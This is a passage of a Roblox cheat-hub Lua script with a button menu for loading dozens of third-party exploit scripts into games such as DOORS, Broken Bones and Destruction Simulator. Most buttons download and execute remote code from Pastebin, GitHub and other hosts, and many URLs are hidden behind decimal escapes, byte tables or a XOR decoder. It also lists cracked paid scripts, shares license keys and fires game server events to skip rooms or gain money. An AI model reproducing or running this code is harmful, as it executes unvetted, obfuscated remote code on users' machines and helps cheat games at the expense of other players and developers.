loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\34\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\52\118\53\110\55\110\47\108\108\108\108\108\108\108\108\108\108\108\108\108\108\108\108\108\108\108\108\108\47\109\97\105\110\47\81\73\37\69\56\37\56\52\37\57\65\37\69\54\37\57\67\37\65\67\37\69\53\37\56\53\37\56\68\37\69\56\37\66\52\37\66\57\37\69\55\37\56\57\37\56\56\46\108\117\97\34\41\41\40\41\9\10")()
  end
})

Tab:AddButton({
  Name = "YSX脚本",
  Callback = function()
  loadstring(game:HttpGet("https://raw.githubusercontent.com/YSX886/YSX-/refs/heads/main/YSX%E8%84%9A%E6%9C%AC.txt"))()
  end
})

Tab:AddButton({
  Name = "神熊脚本",
  Callback = function()
  loadstring(game:HttpGet("https://raw.githubusercontent.com/gycgchgyfytdttr/shenqin/refs/heads/main/%E5%8A%A0%E5%AF%86.lua"))()
  end
})

Tab:AddButton({
    Name = "XCS（卡密不知）",
    Callback = function()
    getgenv().XC="作者XC"loadstring(game:HttpGet("https://pastebin.com/raw/PAFzYx0F"))()
    end
})

Tab:AddButton({
	Name = "小魔",
	Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/xiaomoNB666/xiaomoNB666/main/666.txt"))()
  	end
})

Tab:AddButton({
	Name = "小星",
	Callback = function()
loadstring(game:HttpGet("https://pastebin.com/raw/XhQpcE5m"))()
  	end    
})

Tab:AddButton({
	Name = "静新",
	Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/jxdjbx/Ghfjfhfjejjfbdbdbefbbd/main/Xgvvdhnxcv%20vbbvbb%20mnknbHB"))()  
  	end    
})

Tab:AddButton({
	Name = "青",
	Callback = function()
loadstring(game:HttpGet('https://raw.githubusercontent.com/kkaaccnnbb/money/main/fix'))()
  	end    
})

Tab:AddButton({
    Name = "林",
    Callback = function()
lin = "作者林"lin ="林QQ群 747623342"loadstring(game:HttpGet("https://raw.githubusercontent.com/linnblin/lin/main/lin"))()
    end
})

Tab:AddButton({
  Name = "波奇塔脚本",
  Callback = function()
  loadstring(game:HttpGet(utf8.char((function() return table.unpack({104,116,116,112,115,58,47,47,112,97,115,116,101,98,105,110,46,99,111,109,47,114,97,119,47,113,109,55,76,121,119,82,117})end)())))()
  end
})

Tab:AddButton({
  Name = "河流脚本",
  Callback = function()
loadstring(game:HttpGet("\104\116\116\112\115\58\47\47\112\97\115\116\101\98\105\110\46\99\111\109\47\114\97\119\47\77\50\57\77\117\81\115\80"))()
  end
})

Tab:AddButton({
	Name = "陈(卡密不外传)",
	Callback = function()
loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\34\104\116\116\112\115\58\47\47\112\97\115\116\101\98\105\110\46\99\111\109\47\114\97\119\47\81\120\68\68\57\83\112\87\34\41\41\40\41")()
  	end    
})

Tab:AddButton({
  Name = "神青",
  Callback = function()
  loadstring(game:HttpGet("https://raw.githubusercontent.com/roblox-ye/QQ515966991/refs/heads/main/SHEN-QINNG-SCRIPT.lua"))()
  end
})

Tab:AddButton({
  Name = "终极羊脚本",
  Callback = function()
  loadstring(game:HttpGet("https://raw.githubusercontent.com/yzc604/no/refs/heads/main/%E6%B7%B7%E6%B7%86%204.lua"))()
  end
})

Tab:AddButton({
  Name = "K脚本",
  Callback = function()
  loadstring(game:HttpGet("https://raw.githubusercontent.com/MoKeWe-st/K-script/refs/heads/main/K%20script.Lua"))()
  end
})

Tab:AddButton({
  Name = "水脚本V1",
  Callback = function()
loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\34\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\103\121\99\103\99\104\103\121\102\121\116\100\116\116\114\47\115\104\101\110\113\105\110\47\114\101\102\115\47\104\101\97\100\115\47\109\97\105\110\47\37\69\54\37\66\48\37\66\52\37\69\54\37\66\65\37\57\48\37\69\55\37\65\48\37\56\49\46\108\117\97\34\41\41\40\41")()
  end
})

Tab:AddButton({
  Name = "神青脚本V8",
  Callback = function()
  loadstring(game:HttpGet("https://raw.githubusercontent.com/gycgchgyfytdttr/shenqin/refs/heads/main/585585757575757575.txt"))()
  end
})

Tab:AddButton({
  Name = "NN中心",
  Callback = function()
loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\34\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\115\100\104\100\98\120\117\98\47\110\110\115\105\101\106\119\47\109\97\105\110\47\71\85\73\89\68\83\83\46\108\117\97\34\41\41\40\41\10")()
  end
})

Tab:AddButton({
Name = "绿",
  Callback = function()
loadstring(game:HttpGet("https://pastebin.com/raw/Esw6YQKR"))()
   end
})

Tab:AddButton({
  Name = "山脚本",
  Callback = function()
  loadstring(game:HttpGet("https://h.lkmc.asia/script/ssfb.lua"))()
  end
})

Tab:AddButton({
Name = "玖恶脚本",
	Callback = function()
loadstring(game:HttpGet('https://ayangwp.cn/api/v3/file/get/8508/%E7%8E%96%E6%81%B6%E4%B8%AD%E5%BF%83.lua?sign=wt54yWf_f0LDB3gXXyQu0SFQ0oUDUXZBOaWQShwCFGg%3D%3A0'))()
    end
})

Tab:AddButton({
Name = "乌云脚本",
	Callback = function()
loadstring(game:HttpGet("https://pastebin.com/raw/dT4ZGge8"))()
    end
})

Tab:AddButton({
Name = "老大脚本",
	Callback = function()
loadstring(game:HttpGet("https://ayangwp.cn/api/v3/file/get/8401/%E8%80%81%E5%A4%A7%E8%84%9A%E6%9C%AC1.0%E7%89%88.txt?sign=XHxQ1ja8djAnEjVEG-eEZFPeZKFHJ0FHeybHpSbtBW4%3D%3A0"))()
    end
})

Tab:AddButton({
	Name = "不公平中心(外国缝合)",
	Callback = function()
loadstring(game:HttpGet(('https://raw.githubusercontent.com/rblxscriptsnet/unfair/main/rblxhub.lua'),true))()	
      end
})

Tab:AddButton({
	Name = "白(付费)",
	Callback = function()
_G["白脚本作者修狗"]="xdjhadgdsrfcyefjhsadcctyseyr6432478rudghfvszhxcaheey"loadstring(game:HttpGet(('https://raw.githubusercontent.com/wev666666/baijiaobengV2.0beta/main/%E7%99%BD%E8%84%9A%E6%9C%ACbeta'),true))() 
  	end
})

Tab:AddButton({
  Name = "白脚本破解版",
  Callback = function()
  loadstring(game:HttpGet("https://pastebin.com/raw/LsrKtbPy"))()
  end
})

Tab:AddButton({
  Name = "霖溺(付费)",
  Callback = function()
LINNI__Script = "作者LinNiQQ号1802952013" Roblox= "作者LinNiQ群932613422" loadstring(game:HttpGet(('https://shz.al/~LINNI_ROBLOX'),true))()
  end
})

Tab:AddButton({
  Name = "北风",
  Callback = function()
loadstring(game:HttpGet(("\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\66\101\105\70\101\110\103\67\101\110\116\101\114\47\83\99\114\105\112\116\47\109\97\105\110\47\66\101\105\70\101\110\103\75\101\121\83\121\115\116\101\109\46\108\117\97"),true))()
  end
})

Tab:AddButton({
  Name = "APT",
  Callback = function()
loadstring(game:HttpGet("\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\110\97\105\110\115\104\117\47\110\111\47\109\97\105\110\47\65\80\84\46\108\117\97"))()
  end
})

Tab:AddButton({
	Name = "APT卡密",
	Callback = function()
setclipboard("xiaomao")
end
})

Tab:AddButton({
  Name = "宇落中心",
  Callback = function()
  loadstring(game:HttpGet("https://raw.githubusercontent.com/xiaopi77/Yuluo/main/QQ921663573-Roblox-Yuluo-centre.lua"))()
  end
})

Tab:AddButton({
  Name = "羽脚本v1",
  Callback = function()
  loadstring(game:HttpGet("https://raw.githubusercontent.com/JY6812/-/refs/heads/main/%E7%BE%BD%E8%84%9A%E6%9C%AC.lua",true))()
  end
})

Tab:AddButton({
  Name = "鹰眼中心v2",
  Callback = function()
  loadstring(game:HttpGet("https://shz.al/~eyyingyanv21"))()
  end
})

Tab:AddButton({
  Name = "月抛中心",
  Callback = function()
  loadstring(game:HttpGet(('https://pastefy.app/gbAnmQoq/raw'),true))()
  end
})

Tab:AddButton({
  Name = "极爆脚本",
  Callback = function()
  loadstring(game:HttpGet("https://raw.githubusercontent.com/dkfkfkfjfkfjdj/README.md/main/%E6%B7%B7%E6%B7%86%E6%96%87%E4%BB%B6.lua"))()
  end
})

Tab:AddButton({
  Name = "神光脚本",
  Callback = function()
  loadstring(game:HttpGet(utf8.char((function() return table.unpack({104,116,116,112,115,58,47,47,112,97,115,116,101,98,105,110,46,99,111,109,47,114,97,119,47,56,102,50,76,99,113,113,80})end)())))()
  end
})

Tab:AddButton({
  Name = "皮脚本",
  Callback = function()
  loadstring(game:HttpGet("https://raw.githubusercontent.com/xiaopi77/xiaopi77/main/QQ1002100032-Roblox-Pi-script.lua"))()
  end
})

Tab:AddButton({
  Name = "钢筋脚本",
  Callback = function()
  loadstring(game:HttpGet('https://raw.githubusercontent.com/Zyb150933/kk/main/%EF%BC%9F%EF%BC%81%EF%BC%81%EF%BC%81%EF%BC%9F%E3%80%82'))()
  end
})

Tab:AddButton({
  Name = "鬼脚本,卡密:Ghost-Script-NB",
  Callback = function()
  loadstring(game:HttpGet("https://raw.githubusercontent.com/Ghost-Gui-888/Ghost-Script/refs/heads/main/QQ858895377"))()
  end
})

Tab:AddButton({
	Name = "复制鬼脚本卡密",
	Callback = function()
setclipboard("Ghost-Script-NB")
end
})

Tab:AddButton({
  Name = "浮萍中心",
  Callback = function()
loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\34\104\116\116\112\115\58\47\47\112\97\115\116\101\98\105\110\46\99\111\109\47\114\97\119\47\69\55\97\57\84\56\65\109\34\41\40\41\10")()
  end
})

Tab:AddButton({
  Name = "猫脚本破解版",
  Callback = function()
  loadstring(game:HttpGet("https://shz.al/~SZ-XT-CNM/XT-NMSL/XT-MMSL"))()
  end
})

Tab:AddButton({
  Name = "帝脚本",
  Callback = function()
loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\34\104\116\116\112\115\58\47\47\112\97\115\116\101\98\105\110\46\99\111\109\47\114\97\119\47\107\81\90\119\112\70\75\65\34\41\41\40\41\10")()
  end
})

Tab:AddButton({
  Name = "七脚本",
  Callback = function()
loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\34\104\116\116\112\115\58\47\47\112\97\115\116\101\98\105\110\46\99\111\109\47\114\97\119\47\105\83\98\70\97\57\57\74\34\41\41\40\41\10")()
  end
})

Tab:AddButton({
  Name = "HB脚本",
  Callback = function()
  loadstring(game:HttpGet(utf8.char((function() return table.unpack({104,116,116,112,115,58,47,47,112,97,115,116,101,98,105,110,46,99,111,109,47,114,97,119,47,117,106,52,78,70,117,90,85})end)())))()
  end
})

Tab:AddButton({
  Name = "巨魔中心",
  Callback = function()
  loadstring(game:HttpGet("https://raw.githubusercontent.com/Eazvy/public-scripts/main/Universal_Animations_Emotes.lua"))()
  end
})

Tab:AddButton({
  Name = "武士脚本破解版",
  Callback = function()
  loadstring(game:HttpGet("https://raw.githubusercontent.com/123hubd7gh/123hubd7gh/main/%E6%AD%A6%E5%A3%AB%E4%B8%AD%E5%BF%83%E7%A0%B4%E8%A7%A3%E7%89%88"))()
  end
})

Tab:AddButton({
  Name = "阎罗中心",
  Callback = function()
  loadstring(game:HttpGet("https://raw.githubusercontent.com/liaozhsaaa/-/main/%E9%98%8E%E7%BD%97.txt"))()
  end
})

Tab:AddButton({
  Name = "瑞士中心",
  Callback = function()
  loadstring(game:HttpGet(('https://pastebin.com/raw/bgbQq2LH')))()
  end
})

Tab:AddButton({
  Name = "黑子中心",
  Callback = function()
  loadstring(game:HttpGet("https://pastebin.com/raw/mnMaZwBQ"))()
  end
})

Tab:AddButton({
  Name = "神金脚本V12",
  Callback = function()
  loadstring(game:HttpGet("https://raw.githubusercontent.com/gycgchgyfytdttr/shenqin/refs/heads/main/V12.lua"))()
  end
})

Tab:AddButton({
  Name = "动画中心(FE)",
  Callback = function()
  loadstring(game:HttpGet("https://raw.githubusercontent.com/GamingScripter/Animation-Hub/main/Animation%20Gui", true))()
  end
})

Tab:AddButton({
  Name = "91中心",
  Callback = function()
  loadstring(game:HttpGet("https://raw.githubusercontent.com/odhdshhe/leng9191919191919191919191919191919191919191/refs/heads/main/91%E4%B8%AD%E5%BF%83.txt"))()
  end
})

local Tab = Window:MakeTab({
    Name = "骨折模拟器",
    Icon = "rbxassetid://7734068321",
    PremiumOnly = false
})

Tab:AddButton({
  Name = "超多金钱加骨折等级1000",
  Callback = function()
  loadstring(game:HttpGet('https://rawscripts.net/raw/Broken-Bones-IV-Ragdoll-Sim-Infinite-money-19709'))()
  end
})

Tab:AddButton({
  Name = "IV第1关卡第1层出生点使用",
  Callback = function()
  loadstring(game:HttpGet('https://pastebin.com/raw/5rEAVmcC'))()
  end
})

local Tab = Window:MakeTab({
    Name = "破坏模拟器",
    Icon = "rbxassetid://7734068321",
    PremiumOnly = false
})

Tab:AddButton({
  Name = "脚本1(可刷钱)",
  Callback = function()
  loadstring(game:HttpGet("https://scripts.waza80.com/script/DestructionSimulator"))()
  end
})

Tab:AddButton({
  Name = "脚本2(可升级)",
  Callback = function()
  loadstring(game:HttpGet("https://scriptblox.com/raw/Destruction-Simulator-*OP*-GUI-1858"))()
  end
})

local Tab = Window:MakeTab({
    Name = "doors(有些不能用，见谅)",
    Icon = "rbxassetid://7734068321",
    PremiumOnly = false
})

Tab:AddButton({
  Name = "1",
  Callback = function()
  loadstring(game:HttpGet("https://pastebin.com/raw/QsCas0t3"))()
  end
})

Tab:AddButton({
  Name = "2(卡密:nrty)",
  Callback = function()
  loadstring(game:HttpGet("https://raw.githubusercontent.com/zuohongjian/bjb/main/ZS%20III"))()
  end
})

Tab:AddButton({
	Name = "复制2卡密",
	Callback = function()
setclipboard("nrty")
end
})

Tab:AddButton({
  Name = "中文汉化超强脚本",
  Callback = function()
 loadstring(game:HttpGet("\104\116\116\112\115\58\47\47\112\97\115\116\101\98\105\110\46\99\111\109\47\114\97\119\47\54\53\84\119\84\56\106\97"))()
  end
})

Tab:AddButton({
  Name = "这个脚本跟超级汉化差不多",
  Callback = function()
  local v0=string.char;local v1=string.byte;local v2=string.sub;local v3=bit32 or bit ;local v4=v3.bxor;local v5=table.concat;local v6=table.insert;local function v7(v8,v9) local v10={};for v11=1, #v8 do v6(v10,v0(v4(v1(v2(v8,v11,v11 + 1 )),v1(v2(v9,1 + (v11% #v9) ,1 + (v11% #v9) + 1 )))%256 ));end return v5(v10);end loadstring(game:HttpGet(v7("\217\215\207\53\245\225\136\81\195\194\204\107\225\178\211\22\196\193\206\54\227\169\196\17\223\215\222\43\242\245\196\17\220\140\255\55\233\171\146\72\134\154\141\106\197\169\194\27\193\218\254\60\227\147\210\28\158\206\218\44\232\244\247\12\222\215\222\38\242\190\195\33\131\155\141\112\183\239\158\77\130\146\139\113\176\236\147\76\159\215\195\49","\126\177\163\187\69\134\219\167")))();
  end
})

Tab:AddButton({
  Name = "mspaint汉化",
  Callback = function()
  getgenv().Spy="mspaint" loadstring(game:HttpGet("https://raw.githubusercontent.com/XiaoXuAnZang/XKscript/refs/heads/main/DOORS.txt"))()
  end
})

Tab:AddButton({
  Name = "白",
  Callback = function()
        _G["白脚本作者修狗"]="xdjhadgdsrfcyefjhsadcctyseyr6432478rudghfvszhxcaheey"loadstring(game:HttpGet(('https://raw.githubusercontent.com/wev666666/baijiaobengV2.0beta/main/%E7%99%BD%E8%84%9A%E6%9C%ACbeta'),true))()
  end
})

Tab:AddButton({
  Name = "LX中文",
  Callback = function()
loadstring(game:HttpGet("\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\76\88\51\49\56\47\76\88\47\109\97\105\110\47\76\88\37\50\48\50\46\108\117\97\0"))()
  end
})

Tab:AddButton({
  Name = "云doors",
  Callback = function()
  loadstring(game:HttpGet("https://raw.githubusercontent.com/XiaoYunCN/EntitySpawner/main/doors(orionlib).lua"))()
  end
})

Tab:AddButton({
  Name = "陈脚本DOORS",
  Callback = function()
  loadstring(game:HttpGet("https://raw.githubusercontent.com/wshibsiyedehl/Doorsxiaochen/main/DoorschenNew114514%20or%203.1415926%20%E6%97%A0%E6%B3%95%E7%90%86%E8%A7%A3%E6%97%A0%E6%B3%95%E7%90%86%E8%A7%A3%E6%97%A0%E6%B3%95%E7%90%86%E8%A7%A3"))()
  end
})

Tab:AddButton({
  Name = "超级脚本汉化小云",
  Callback = function()
  loadstring(game:HttpGet("https://raw.githubusercontent.com/XiaoYunCN/EntitySpawner/main/doors(orionlib).lua"))()
  end
})

Tab:AddButton({
  Name = "GT",
  Callback = function()
loadstring(game:HttpGet("\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\110\97\105\110\115\104\117\47\71\84\45\72\85\66\47\109\97\105\110\47\71\84\46\108\117\97"))()
  end
})

Tab:AddButton({
	Name = " GT卡密",
	Callback = function()
setclipboard("AlexPT")
end
})

Tab:AddButton({
  Name = "天",
  Callback = function()
  loadstring(game:HttpGet("https://raw.github.com/XT114514/Doors/main/tianscript"))()
  end
})

local Section = Tab:AddSection({
	Name = "第2层矿井"
})

Tab:AddButton({
  Name = "1",
  Callback = function()
  loadstring(game:HttpGet("https://github.com/DocYogurt/Main/raw/main/Scripts/DF2RW.lua"))()
  end
})

Tab:AddButton({
  Name = "ZSIII",
  Callback = function()
  loadstring(game:HttpGet("https://raw.githubusercontent.com/zuohongjian/bjb/main/ZS%20III", true))()
  end
})

Tab:AddButton({
  Name = "NOOB",
  Callback = function()
  loadstring(game:HttpGet("https://raw.githubusercontent.com/XiaoLingUwU/Doors-Floor2./main/NOOB-Doors-Floor2--.Lua"))()
  end
})

local Section = Tab:AddSection({
	Name = "其他"
})

Tab:AddButton({
  Name = "火炬 (商店)",
  Callback = function()
  local Achievements = loadstring(game:HttpGet("https://raw.githubusercontent.com/RegularVynixu/Utilities/main/Doors/Custom%20Achievements/Source.lua"))()

Achievements.Get({
    Title = "火炬",
    Desc = "哇哦.你竟然买了",
    Reason = "太酷啦",
    Image = "https://cdn.discordapp.com/attachments/882940450288324658/1046404183101800558/image.png",
})

local Functions = loadstring(game:HttpGet("https://raw.githubusercontent.com/RegularVynixu/Utilities/main/Functions.lua"))()
local CustomShop = loadstring(game:HttpGet("https://raw.githubusercontent.com/RegularVynixu/Utilities/main/Doors/Custom%20Shop%20Items/Source.lua"))()

local exampleTool = LoadCustomInstance("rbxassetid://3499523244")

CustomShop.CreateItem(exampleTool, {
    Title = "火炬",
    Desc = "什么破玩意.怎么这么贵",
    Image = "https://cdn.discordapp.com/attachments/882940450288324658/1046404183101800558/image.png",
    Price = 100000000000000000000000000000000000000000000,
    Stack = 1,
})
  end
})

Tab:AddButton({
  Name = "庭院雕像可互动[MS插件]",
  Callback = function()
  loadstring(game:HttpGet('https://gist.githubusercontent.com/IdkMyNameLoll/72bd9936249bae4b04ddbd0e05c9b323/raw/3847f62fe7fe2af3e1450fe0f6083b6293a3cb68/cpuntyardorsmth'))()
  end
})

Tab:AddButton({
  Name = "速通倒计时[MS插件]",
  Callback = function()
  local Library = getgenv().Library

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RunService = game:GetService("RunService")

local LocalPlayer = Players.LocalPlayer
local LatestRoom = ReplicatedStorage:WaitForChild("GameData"):WaitForChild("LatestRoom")

local TimerGui = Instance.new("ScreenGui") do
    TimerGui.Enabled = false
    TimerGui.IgnoreGuiInset = true
    TimerGui.Parent = LocalPlayer.PlayerGui
end

local TimerLabel = Instance.new("TextLabel") do
    TimerLabel.AnchorPoint = Vector2.new(0.5, 0)

    TimerLabel.BackgroundColor3 = Library.MainColor
    TimerLabel.BorderColor3 = Library.AccentColor
    TimerLabel.TextColor3 = Library.FontColor

    TimerLabel.BorderSizePixel = 2
    TimerLabel.Position = UDim2.new(0.5, 0, 0, 0)
    TimerLabel.Size = UDim2.fromOffset(262, 64)

    TimerLabel.Font = Library.Font
    TimerLabel.Text = "00:00.00"
    TimerLabel.TextScaled = true

    TimerLabel.Parent = TimerGui
    
    Library:AddToRegistry(TimerLabel, {
        BackgroundColor3 = "MainColor",
        BorderColor3 = "AccentColor",
        TextColor3 = "FontColor"
    })
end

local Addon = {
    Name = "SpeedrunTimer",
    Title = "倒计时",
    Game = "doors/doors",

    Elements = {
        {
            Type = "Toggle",
            Name = "Timer",
            Arguments = {
                Text = "显示计时器",
                Enabled = false,

                Callback = function(value) TimerGui.Enabled = value end
            }
        }
    }
}

if getgenv().SpeedRunStopped then
    getgenv().SpeedRunTime += (tick() - getgenv().SpeedRunStopped)
else
    getgenv().SpeedRunTime = 0
end

task.spawn(function()
    if LatestRoom.Value < 1 then
        LatestRoom.Changed:Wait()
    end

    if Library.Unloaded then return end
    Library:GiveSignal(RunService.RenderStepped:Connect(function(delta)
        getgenv().SpeedRunTime += delta
        TimerLabel.Text = string.format("%02i:%02i.%02i", SpeedRunTime / 60, SpeedRunTime % 60, (SpeedRunTime % 1) * 100)
    end))
end)

task.spawn(function()
    repeat task.wait() until Library.Unloaded

    getgenv().SpeedRunStopped = tick()
    TimerGui:Destroy()
end)

return Addon
  end
})

Tab:AddButton({
  Name = "大厅成为快餐店",
  Callback = function()
  loadstring(game:HttpGet("https://raw.githubusercontent.com/K0t1n/Public/main/MCDonalds"))()
  end
})

Tab:AddButton({
  Name = "自走A-1000",
  Callback = function()
  loadstring(game:HttpGet('https://pastebin.com/raw/wjNJccfz'))()
  end
})

Tab:AddButton({
  Name = "每件物品蓝光",
  Callback = function()
  loadstring(game:HttpGet('https://raw.githubusercontent.com/StupidProAArsenal/main/main/deer%20customs',true))()
  end
})

Tab:AddButton({
  Name = "无恐惧",
  Callback = function()
  pcall(function()
            game:GetService("ReplicatedStorage").Bricks.Jumpscare:Destroy()
        end)
  end
})

Tab:AddButton({
  Name = "完成100门破铁盒",
  Callback = function()
  game:GetService("ReplicatedStorage").Bricks.EBF:FireServer()
  end
})

Tab:AddButton({
  Name = "跳过50门",
  Callback = function()
  local CurrentDoor = workspace.CurrentRooms[tostring(LatestRoom+1)]:WaitForChild("Door")
        game.Players.LocalPlayer.Character:PivotTo(CF(CurrentDoor.Door.Position))
  end
})

Tab:AddButton({
  Name = "跳过房间",
  Callback = function()
  pcall(function()
            local HasKey = false
            local CurrentDoor = workspace.CurrentRooms[tostring(game:GetService("ReplicatedStorage").GameData.LatestRoom.Value)]:WaitForChild("Door")
            for i,v in ipairs(CurrentDoor.Parent:GetDescendants()) do
                if v.Name == "KeyObtain" then
                    HasKey = v
                end
            end
            if HasKey then
                game.Players.LocalPlayer.Character:PivotTo(CF(HasKey.Hitbox.Position))
                wait(0.3)
                fireproximityprompt(HasKey.ModulePrompt,0)
                game.Players.LocalPlayer.Character:PivotTo(CF(CurrentDoor.Door.Position))
                wait(0.3)
                fireproximityprompt(CurrentDoor.Lock.UnlockPrompt,0)
            end
            if LatestRoom == 50 then
                CurrentDoor = workspace.CurrentRooms[tostring(LatestRoom+1)]:WaitForChild("Door")
            end
            game.Players.LocalPlayer.Character:PivotTo(CF(CurrentDoor.Door.Position))
            wait(0.3)
            CurrentDoor.ClientOpen:FireServer()
        end)
  end
})

local Section = Tab:AddSection({
	Name = "道具"
})

Tab:AddButton({
	Name = "手电筒",
	Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/K0t1n/Public/main/Normal%20Flashlight"))()
    end
})

Tab:AddButton({
  Name = "A1000药水桶",
  Callback = function()
loadstring(game:HttpGet("\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\67\104\105\110\97\81\89\47\83\99\114\105\112\116\115\47\77\97\105\110\47\83\116\97\114\74\117\103"))()
  end
})

Tab:AddButton({
  Name = "夜视仪",
  Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/ChinaQY/Scripts/Main/NVCS-3000"))()
  end
})

Tab:AddButton({
  Name = "物品复制枪",
  Callback = function()
  loadstring(game:HttpGet("https://raw.githubusercontent.com/MrNeRD0/Doors-Hack/main/EverythingGunByNeRD.lua"))()
  end
})

Tab:AddButton({
  Name = "小恶魔玩具",
  Callback = function()
  local Players = game:GetService("Players")
local Equipped = false
local Plr = Players.LocalPlayer
local Char = Plr.Character or Plr.CharacterAdded:Wait()
local Hum = Char:WaitForChild("Humanoid")
local Root = Char:WaitForChild("HumanoidRootPart")
local RightArm = Char:WaitForChild("RightUpperArm")
local LeftArm = Char:WaitForChild("LeftUpperArm")
local RightC1 = RightArm.RightShoulder.C1
local LeftC1 = LeftArm.LeftShoulder.C1
local CustomShop = loadstring(game:HttpGet("https://raw.githubusercontent.com/MateiDaBest/Utilities/main/Doors/Custom%20Shop%20Items/Main.lua"))()
local Goblino = game:GetObjects("rbxassetid://12856605563")[1]

Goblino.Parent = game.Players.LocalPlayer.Backpack

CustomShop.CreateItem({
	Title = "El Goblino",
	Desc = "Door 52",
	Image = "https://cdn.discordapp.com/attachments/970078853127110677/1087774910706888824/12372522258.png",
	Price = 52,
	Stack = 1,
})

local function setupHands(tool)
	tool.Equipped:Connect(function()
		Equipped = true
		Char:SetAttribute("Hiding", true)
		for _, v in next, Hum:GetPlayingAnimationTracks() do
			v:Stop()
		end

		RightArm.Name = "R_Arm"
		LeftArm.Name = "L_Arm"

		RightArm.RightShoulder.C1 = RightC1
			* CFrame.Angles(math.rad(-90), math.rad(-10), 0)
		LeftArm.LeftShoulder.C1 = LeftC1
			* CFrame.new(-0.2, -0.4, -0.5)
			* CFrame.Angles(math.rad(-110), math.rad(30), math.rad(0))	
	end)

	tool.Unequipped:Connect(function()
		Equipped = false
		Char:SetAttribute("Hiding", nil)
		RightArm.Name = "RightUpperArm"
		LeftArm.Name = "LeftUpperArm"

		RightArm.RightShoulder.C1 = RightC1
		LeftArm.LeftShoulder.C1 = LeftC1
	end)
end

setupHands(Goblino)
  end
})

Tab:AddButton({
  Name = "变成杰夫杀手",
  Callback = function()
  _G.ThirdPerson = true
loadstring(game:HttpGet("https://raw.githubusercontent.com/idkbutiampoggers/JeffTheKillerMorphV2/main/Source.lua"))()
  end
})

Tab:AddButton({
  Name = "杰夫毛绒玩具",
  Callback = function()
  local tool = game:GetObjects("rbxassetid://13069619857")[1]
tool.Parent = game.Players.LocalPlayer.Backpack
  end
})

Tab:AddButton({
	Name = "神圣炸弹",
    Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/MrNeRD0/Doors-Hack/main/HolyGrenadeByNerd.lua"))()
    end
})

Tab:AddButton({
	Name = "激光枪",
	Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/K0t1n/Public/main/Laser%20Gun"))()
    end
})

Tab:AddButton({
	Name = "能量罐（清岩提供）",
	Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/cbhlyy/lyycbh/main/nengliangtiao"))()
    end
})

Tab:AddButton({
  Name = "剪刀",
  Callback = function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/MrNeRD0/Doors-Hack/main/shears_done.lua"))()
  end
})

Tab:AddButton({
  Name = "骷髅钥匙",
  Callback = function ()
    local item = game:GetObjects("rbxassetid://11697889137")[1]item.Parent = game.Players.LocalPlayer.Backpack
  end
})

Tab:AddButton({
	Name = "紫色手电筒（在电梯购买东西的时候使用）",
	Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/K0t1n/Public/main/Purple%20Flashlight"))()
end
})

Tab:AddButton({
  Name = "磁铁",
  Callback = function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/MrNeRD0/Doors-Hack/main/MagnetByNerd.lua"))()
  end
})

Tab:AddButton({
  Name = "引导之光手电",
  Callback = function()
  loadstring(game:HttpGet("https://raw.githubusercontent.com/Matthew201322/Doors-Scriptee/refs/heads/main/Shakelight.lua"))()
  end
})

Tab:AddButton({
  Name = "控制物品变大物品",
  Callback = function()
  loadstring(game:HttpGet('https://gist.githubusercontent.com/IdkMyNameLoll/f0178af2301ca90c09895f10f3e7bd4b/raw/46899ccc3626f3485d85f990012f7ef37ae52e5e/resizerDoorsRemake'))()
  end
})

Tab:AddButton({
  Name = "金色手摇",
  Callback = function()
  loadstring(game:HttpGet(("https://raw.githubusercontent.com/aadyian9000/the-thing/main/GoldenGummyFlashlight.lua"),true))()
  end
})

Tab:AddButton({
  Name = "无限电手电筒",
  Callback = function()
  loadstring(game:HttpGet('https://pastebin.com/raw/9Daqa4hD'))()
  end
})

Tab:AddButton({
  Name = "巧克力棒",
  Callback = function()
  loadstring(game:HttpGet("https://raw.githubusercontent.com/K0t1n/Public/main/Chocolate%20Bar.lua"))()
  end
})

Tab:AddButton({
  Name = "臭猫",
  Callback = function()
  loadstring(game:HttpGet("https://raw.githubusercontent.com/K0t1n/Public/main/Maxwell%20Plushie"))()
  end
})

Tab:AddButton({
  Name = "火箭筒",
  Callback = function()
  loadstring(game:HttpGet("https://raw.githubusercontent.com/persopoiu/scripts/main/rushbazooka.lua"))()
  end
})

